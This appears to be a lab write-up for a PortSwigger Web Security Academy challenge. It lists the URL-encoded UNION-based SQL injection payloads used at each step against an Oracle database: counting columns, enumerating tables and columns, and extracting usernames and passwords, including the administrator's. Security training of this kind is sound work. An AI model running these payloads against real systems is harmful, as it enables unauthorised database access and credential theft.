## Find the number of columns:
+ `'+ORDER+BY+3--`
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/b9740cdd-4a45-4f7c-b4b3-41035a68af92)  
## Find out the table names:
+ `'UNION+SELECT+table_name,+NULL+FROM+all_tables--`
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/bcbf8c93-54ed-495c-9528-d218037a39d8)  
  + ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/2c41f083-1f6d-4436-a38f-7ad122d8a719)
## Find out the column names:
+ `'UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name%3d'USERS_MPMRBI'--`
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/108fe573-b717-4772-abe1-db52f019161d)  
  + ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/14409afe-04b2-4e81-ba67-a6f8551ca4b4)  
## Retrieving the content of the table:
+ `'UNION+SELECT+USERNAME_HZWOIU,+PASSWORD_FFZZFS+FROM+USERS_MPMRBI--`
  + **OR**
+ `'UNION+SELECT+USERNAME_HZWOIU,+PASSWORD_FFZZFS+FROM+USERS_MPMRBI+WHERE+USERNAME_HZWOIU%3d'administrator'-- `
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/fe2ad5d7-d6a6-4613-8405-fbcf03a9a39b)
  + ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/fff8c208-d7a9-47e6-ab2a-5646224c7c90)

  + ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/93614a57-e5ef-47b7-85ce-041289f24633)





